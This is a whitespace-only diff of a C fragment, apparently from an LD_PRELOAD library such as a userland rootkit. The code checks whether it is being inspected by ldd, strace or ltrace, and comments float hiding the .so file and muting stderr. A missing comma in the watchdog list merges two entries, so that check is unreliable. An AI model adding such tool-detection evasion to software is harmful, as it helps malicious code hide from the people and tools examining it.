@@ -36,19 +36,19 @@ void init(void)
 
     if((handle = fopen("/proc/self/cmdline", "r")))
     {
-		while(getdelim(&caller, &len, 0, handle) != -1)
-		{
-	        if(watchdog(caller))
-    	    {
-        	    /* system("mv h0h0.so .h0h0.so"); */        /* Silly idea? */
+        while(getdelim(&caller, &len, 0, handle) != -1)
+        {
+            if(watchdog(caller))
+            {
+            	/* system("mv h0h0.so .h0h0.so"); */        /* Silly idea? */
             	/* freopen("/dev/null", "w", stderr); */    /* {s,l}trace writes to stderr (try something else). */
-
-				puts("Watchdog found!\n");
-            	lib_loaded = false;
-        	}
-		}
-
-		free(caller);
+           	
+                puts("Watchdog found!\n");
+                lib_loaded = false;
+            }
+        }
+	
+        free(caller);
         fclose(handle);
     }
 
@@ -86,7 +86,7 @@ int watchdog(char *func)
     size_t i, wd_size;
     const char *watchdogs[] = \
     {
-		"/usr/bin/ldd"
+        "/usr/bin/ldd"
         "strace",
         "ltrace"
     };
